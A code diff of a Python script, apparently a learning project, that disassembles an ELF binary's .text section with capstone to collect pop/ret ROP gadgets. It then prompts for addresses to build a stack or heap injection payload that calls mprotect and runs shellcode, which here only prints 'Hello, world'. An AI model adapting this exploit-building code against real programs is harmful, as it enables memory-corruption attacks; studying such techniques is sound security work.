@@ -1,10 +1,9 @@
 # disas.py
 
-import sys
 from capstone import *
 from elftools.elf.elffile import ELFFile
 from elftools.elf.relocation import RelocationSection
-filename= '/usr/bin/make'
+filename= '/usr/bin/pigz'
 disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args
 
 def zerochecker(bytes, expectedLength):
@@ -15,37 +14,21 @@ def zerochecker(bytes, expectedLength):
 with open(filename, 'rb') as file:
         elf = ELFFile(file)
         code = elf.get_section_by_name('.text')
-
         ops = code.data() # type bytes
-        opslist = ops.split(b'\xc3')
-        opslist_index = 0
-        while opslist_index < len(opslist) - 1:
-            opslist[opslist_index] += b'\xc3'
-            opslist_index += 1
-
-        for x in opslist:
-            print(x)
-
+        # ops2 = ops[-15:]
         addr = code['sh_addr'] # type int
         md = Cs(CS_ARCH_X86, CS_MODE_64)
 
         # gets all instructions, intended or not
 
-        # want a list of byte arrays made from ops, split at returns (\xc3)
-        # have addr etc for first one
-        # for next call, increment addr by len of previous byte array
-
-        while(opslist != []):
-            while (opslist[0] != b""):
-                for (address, size, mnemonic, op_str) in md.disasm_lite(opslist[0], addr):
-                    if ((mnemonic ==  "pop") or (mnemonic == "ret")):
-                         disas.append((address,mnemonic,op_str))
-                         print("added a gadget, length of gadget list (with duplicates) = " + str(len(disas)))
-                addr += 1
-                opslist[0] = opslist[0][1:]
-            opslist = opslist[1:]
-
-print("done with both while loops!")
+        while(ops != b""):
+            for (address, size, mnemonic, op_str) in md.disasm_lite(ops, addr):
+                if mnemonic == 'pop' or mnemonic == 'ret':
+                    disas.append((address,mnemonic,op_str))
+                    #print(len(disas))
+            addr += 1
+            ops = ops[1:]
+            print(len(ops))
 
 gadgets = []
 gadgetIndex = 0
@@ -119,15 +102,12 @@ print(rsi_addr)
 print("shortest_rdx = " + str(shortest_rdx))
 print(rdx_addr)
 
-if (shortest_rdi == 100) or (shortest_rsi == 100) or (shortest_rdx == 100):
-    sys.exit("Unable to find necessary gadgets to build payload!")
-
 heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for stack: ")
 if heapOrStack == "S":
         baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\":  ")
-        addressOfMprotect = input("Input address of mprotect (PLT or libc is fine), including leading  \"0x\": ")
-        addressOfPayload = input("Input address of start of ROP payload, including leading  \"0x\": ")
-        baseOfStack = input("Input address of the base of the stack, including leading  \"0x\"")
+        addressOfMprotect = input("Input address of mprotect (PLT or libc is fine): ")
+        addressOfPayload = input("Input address of start of ROP payload")
+        baseOfStack = input("Input address of the base of the stack")
         shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x01\x48\x81\xee\x10\x11\x11\x01\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x48\x83\xc7\x64\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"
         rdi_addr.reverse()
         rsi_addr.reverse()
